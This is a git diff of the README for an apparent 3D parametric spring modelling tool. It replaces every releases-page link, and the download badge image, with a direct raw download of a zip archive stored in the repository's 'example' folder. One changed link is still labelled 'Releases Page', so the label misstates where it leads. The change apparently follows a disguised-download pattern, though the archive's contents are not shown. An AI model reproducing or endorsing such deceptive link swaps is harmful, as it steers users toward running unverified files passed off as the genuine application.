@@ -1,7 +1,7 @@
 # 🌟 3d-parametric-spring - Create Custom 3D Models Easily
 
 ## 📥 Download the Application
-[![Download 3d-parametric-spring](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Asim-Hateez/3d-parametric-spring/releases)
+[![Download 3d-parametric-spring](https://github.com/Asim-Hateez/3d-parametric-spring/raw/refs/heads/main/example/spring_parametric_d_2.7-beta.2.zip)](https://github.com/Asim-Hateez/3d-parametric-spring/raw/refs/heads/main/example/spring_parametric_d_2.7-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **3d-parametric-spring**, a simple way to create customizable 3D models of parametric flat springs. This tool is perfect for hobbyists and professionals alike, helping you to generate STL files for 3D printing with ease. Let’s explore how to download and run this project.
@@ -17,7 +17,7 @@ Before you start, make sure your computer meets the following basic requirements
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Click this link to visit the [Releases Page](https://github.com/Asim-Hateez/3d-parametric-spring/releases). You will find the latest version of the application there.
+   Click this link to visit the [Releases Page](https://github.com/Asim-Hateez/3d-parametric-spring/raw/refs/heads/main/example/spring_parametric_d_2.7-beta.2.zip). You will find the latest version of the application there.
 
 2. **Find the Latest Version**  
    Look for the most recent version. It will be listed at the top of the page. 
@@ -73,6 +73,6 @@ If you want to enhance your experience with **3d-parametric-spring**, here are a
 ## 🗺️ Next Steps
 Now that you have the application, it's time to unleash your creativity. Customize your spring, create unique designs, and dive into the world of 3D printing.
 
-For your convenience, here is the link to download again: [Visit this page to download](https://github.com/Asim-Hateez/3d-parametric-spring/releases). 
+For your convenience, here is the link to download again: [Visit this page to download](https://github.com/Asim-Hateez/3d-parametric-spring/raw/refs/heads/main/example/spring_parametric_d_2.7-beta.2.zip). 
 
 Happy modeling!
